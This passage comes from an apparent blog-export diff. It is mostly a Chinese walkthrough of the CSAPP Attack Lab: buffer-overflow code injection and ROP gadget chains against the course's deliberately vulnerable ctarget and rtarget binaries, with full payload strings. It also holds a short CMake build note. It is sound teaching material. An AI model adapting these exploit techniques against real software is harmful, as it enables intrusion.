-<p><a href="https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">良性代码，恶意利用：浅谈 Return-Oriented 攻击</a></p>
-]]></content>
-      <categories>
-        <category>CSAPP</category>
-      </categories>
-      <tags>
-        <tag>CSAPP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CSAPP 二进制炸弹实验</title>
     <url>/2020/0726174022.html</url>
     <content><![CDATA[<h3 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h3><p>二进制炸弹是一个作为目标代码提供的程序。运行时提示用户输入6个不同的字符串，如其中一个字符串不正确，炸弹会引爆并打印一条错误信息。需要通过反汇编确定输入的6个字符串，从而拆除炸弹。</p>
@@ -863,8 +652,219 @@
         <category>CSAPP</category>
       </categories>
       <tags>
-        <tag>CSAPP</tag>
         <tag>Assembly</tag>
+        <tag>CSAPP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>源码编译并安装CMake</title>
+    <url>/2020/0726174432.html</url>
+    <content><![CDATA[<p>从官网安装指定版本， 以<code>3.12.1</code>版本为例：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.12/cmake-3.12.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.12.1.tar.gz</span><br><span class="line">cd cmake-3.12.1</span><br><span class="line">./bootstrap</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<p>查看cmake版本，检查是否安装成功</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CMake</category>
+      </categories>
+      <tags>
+        <tag>CMake</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSAPP 缓冲区溢出实验</title>
+    <url>/2020/0802174715.html</url>
+    <content><![CDATA[<h3 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。</p>
+<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
+<li><p>缓冲区溢出的原理，参考《CSAPP原书第3版》<code>3.10</code>小节</p>
+</li>
+<li><p><code>gdb</code>和<code>objdump</code>使用</p>
+</li>
+<li><p>x86_64下的汇编</p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>首先获取实验所需文件<code>target1.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
+<p><code>linux</code>下执行<code>tar xvf target1.tar</code>，得到如下文件。每个文件作用简述如下：</p>
+<ul>
+<li><p><code>ctarget</code>：代码注入攻击的程序。</p>
+</li>
+<li><p><code>rtarget</code>：ROP攻击的程序。</p>
+</li>
+<li><p><code>cookie.txt</code>: 记录<code>cookie</code>的值，攻击时需要用到。</p>
+</li>
+<li><p><code>farm.c</code>: 用于ROP攻击寻找<code>gadget</code>的文件。</p>
+</li>
+<li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
+</li>
+</ul>
+<p>实验共有5关，每一关的目标如下：<br><img data-src="/2020/0802174715/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
+<p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>ctarget</code>中还定义了<code>touch1</code>函数，C代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: you called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本关的目标是：在<code>getbuf</code>函数返回时，令程序跳转到<code>touch1()</code>而不是从<code>test()</code>正常返回。</p>
+<p>我们需要攻击<code>getbuf</code>函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。</p>
+<p>首先查看<code>getbuf</code>函数的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转</span><br></pre></td></tr></table></figure>
+
+<p>从<code>sub  0x28 %rsp</code>看出， <code>getbuf</code>函数在栈上分配了<code>40</code>个字节。再看下<code>test</code>函数的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
+<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img data-src="/2020/0802174715/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+
+<p>构造攻击字符串, 写到文件<code>hex1</code></p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>hex2raw</code>工具将字节码转为字符串，写到文件<code>answer1</code>， 用法如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; hex1 &gt; answer1</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>ctarget</code>程序验证结果，其中<code>-i</code>指定字符串所在文件，<code>-q</code>必选参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看<code>touch2</code>代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，我们需要在跳转到<code>touch2</code>的时候将<code>cookie</code>的值作为参数传递。思路如下：</p>
+<ul>
+<li><p>将返回地址改写为栈中的注入代码的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
+</li>
+<li><p>在注入代码中，将<code>cookie</code>值传递到<code>%rdi</code>。因为<code>x86-64</code>汇编使用<code>%rdi</code>作为第一个参数</p>
+</li>
+<li><p>确定<code>touch2</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
+</li>
+</ul>
+<p>首先确定栈的地址，在<code>0x4017af callq 401a40 &lt;Gets&gt;</code>处打断点，查看<code>%rsp</code>值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb ctarget</span><br><span class="line">(gdb) set args -q -i answer1</span><br><span class="line">(gdb) b *0x4017af</span><br><span class="line">Breakpoint 1 at 0x4017af: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14</span><br><span class="line">14      buf.c: No such file or directory.</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>
+
+<p>得到栈的地址为<code>0x5561dc78</code>, 这正是我们注入代码所在的位置。</p>
+<p>接下来需要将<code>cookie</code>值传给<code>%rdi</code>，再跳转到<code>touch2</code>。<code>touch2</code>地址可通过查看汇编代码得到，结果是<code>0x4017ec</code>；跳转到touch2的思路是：<strong>先利用<code>push</code>指令将<code>touch2</code>地址压栈，接着用<code>retq</code>从栈中弹出<code>touch2</code>地址并跳转。</strong></p>
+<p>编写如下注入代码，保存到文件<code>inject2.s</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>gcc -c inject2.s</code>, <code>objdump -d inject2.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>综上，得到我们需要输入的字符串</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image3.png"></p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>touch3</code>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和第二关类似，我们需要传入<code>cookie</code>字符串并跳转到<code>touch3</code>。但需要注意<code>hexmatch</code>函数被调用后，会覆盖一部分<code>getbuf</code>的缓冲区。为了避免这一点，可以将<code>cookie</code>字符串放到<code>test</code>的栈帧里。这一关的思路如下：</p>
+<ul>
+<li><p>将返回地址改写为注入代码所在的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
+</li>
+<li><p>将<code>cookie</code>字符串放到<code>test</code>的栈帧里。在注入代码中，将<code>cookie</code>串的首地址传递到<code>%rdi</code>。</p>
+</li>
+<li><p>确定<code>touch3</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
+</li>
+</ul>
+<p>与第二关类似，编写如下注入代码，保存到文件<code>inject3.s</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处</span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈</span><br><span class="line">retq						# 将touch3地址退栈，并跳转执行touch3</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>gcc -c inject3.s</code>, <code>objdump -d inject3.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>我第一次写这块汇编代码时，犯了两个错误：</p>
+<ul>
+<li><p>将<code>$0x5561dca8</code>错写成<code>$0x5561dca4</code>, 导致段错误。<strong>注意64位机器上执行压栈和退栈操作，栈指针<code>%rsp</code>应该减去或加上<code>8</code>，而不是<code>4</code></strong></p>
+</li>
+<li><p><code>pushq  $0x4018fa</code>中漏写了<code>$</code>符号，导致压栈的数据不对。<strong>注意对立即数操作时必须加上$符号</strong></p>
+</li>
+</ul>
+<p>用<code>man ascii</code>查表 ，将字符串<code>59b997fa</code>转成ASCII码：<code>35 39 62 39 39 37 66 61</code></p>
+<p>综上，得到我们需要输入字符串</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image4.png"></p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
+<ul>
+<li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
+<li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
+</ul>
+<p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
+<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img data-src="/2020/0802174715/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
+<ul>
+<li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
+<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img data-src="/2020/0802174715/image6.png"><br><img data-src="/2020/0802174715/image7.png"><br><img data-src="/2020/0802174715/image8.png"><br><img data-src="/2020/0802174715/image9.png"></li>
+</ul>
+<p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
+<p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:   c3                      retq</span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:   c3                      retq</span><br><span class="line"># ......</span><br></pre></td></tr></table></figure>
+
+<p>为了将<code>cookie</code>传给<code>%rdi</code>，可以先将<code>cookie</code>的值写到栈，再利用<code>popq %rdi</code>指令实现。</p>
+<p>查表可知<code>pop</code>的编码在<code>58 ~ 5f</code>。全局搜索后没找到<code>5f c3</code>或<code>5f 90 c3</code>，说明不能用<code>$popq %rdi</code>一步到位；但是可以在<code>addval_219</code>中找到<code>58 90 c3</code>，先将栈中的值弹出传到<code>%rax</code>。记录起始地址为<code>0x4019ab</code>。</p>
+<p>接着想办法把<code>%rax</code>的值传递到<code>%rdi</code>。查表，在gadget中找到<code>48 89 c7</code>，也就是<code>movq %rax, %rdi</code>指令，可以在<code>&lt;addval_273&gt;</code>中找到，而且后面正好跟了<code>c3</code>，记录起始地址为<code>0x4019a2</code>。</p>
+<p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image10.png"></p>
+<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
+<p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
+<p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3</span><br></pre></td></tr></table></figure>
+
+<p>再结合所有<code>gadget</code>，多次尝试后发现一个可行解，如下：</p>
+<ul>
+<li><p>将<code>%rsp</code>传给<code>%rdi</code>，利用<code>mov</code>实现。</p>
+</li>
+<li><p>将偏移传给<code>%rsi</code>， 需利用<code>pop</code>和多个<code>mov</code>实现。偏移量需要在找到所有<code>gadget</code>后通过计算得出。</p>
+</li>
+<li><p>用<code>lea (%rdi,%rsi,1),%rax</code>，将<code>cookie</code>串的首地址传给<code>%rax</code></p>
+</li>
+<li><p>将<code>%rax</code>传给<code>%rdi</code>，利用<code>mov</code>指令</p>
+</li>
+</ul>
+<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><h5 id="1-将-rsp传给-rdi"><a href="#1-将-rsp传给-rdi" class="headerlink" title="1. 将%rsp传给%rdi"></a>1. 将<code>%rsp</code>传给<code>%rdi</code></h5><p>通过<code>movq %rsp,%rax</code>,<code>movq %rax,%rdi</code>实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p><code>movq %rsp,%rax</code>编码为<code>48 89 e0</code>, 地址为<code>0x401aad</code>。</p>
+<p><code>movq %rax %rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019a2</code>。</p>
+<h5 id="2-将偏移传给-rsi"><a href="#2-将偏移传给-rsi" class="headerlink" title="2. 将偏移传给$rsi"></a>2. 将偏移传给<code>$rsi</code></h5><p>先将偏移写到栈里，再通过如下<code>4</code>条指令传到<code>$rsi</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %rsi</span><br></pre></td></tr></table></figure>
+
+<p>在以下的<code>gadget</code>中找到这<code>4</code>条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:   c3                      retq</span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:   c3                      retq</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax</span><br><span class="line">  401a38:   c3                      retq</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p><code>pop %rax</code>编码为<code>58</code>, 地址为<code>0x4019cc</code>。</p>
+<p><code>mov %eax %edx</code>编码为<code>89 c2</code>，地址为<code>0x4019dd</code>。</p>
+<p><code>mov %edx %ecx</code>编码为<code>89 d1</code>，地址为<code>0x401a34</code>。</p>
+<p><code>mov %ecx,%esi</code>编码为<code>89 ce</code>，地址为<code>0x401a13</code>。</p>
+<h5 id="3-将cookie字符串传给-rdi"><a href="#3-将cookie字符串传给-rdi" class="headerlink" title="3. 将cookie字符串传给%rdi"></a>3. 将<code>cookie</code>字符串传给<code>%rdi</code></h5><p>利用<code>lea ($rdi,%rsi,1),%rax</code>，地址为<code>0x4019d6</code>。</p>
+<h5 id="4-将-rax传给-rdi"><a href="#4-将-rax传给-rdi" class="headerlink" title="4. 将%rax传给$rdi"></a>4. 将<code>%rax</code>传给<code>$rdi</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p><code>mov %rax,%rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019c5</code>。</p>
+<p>到此，我们完成了<code>gadget</code>的构造，只需继续在栈中依次填入<code>touch3</code>返回地址，<code>cookie</code>字符串，<code>0</code>(字符串结束标志)，再确定偏移即可。</p>
+<p>偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了<code>9</code>条指令，因此偏移量为<code>72</code>, 即<code>0x48</code></p>
+<p>输入的字符串如下：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# 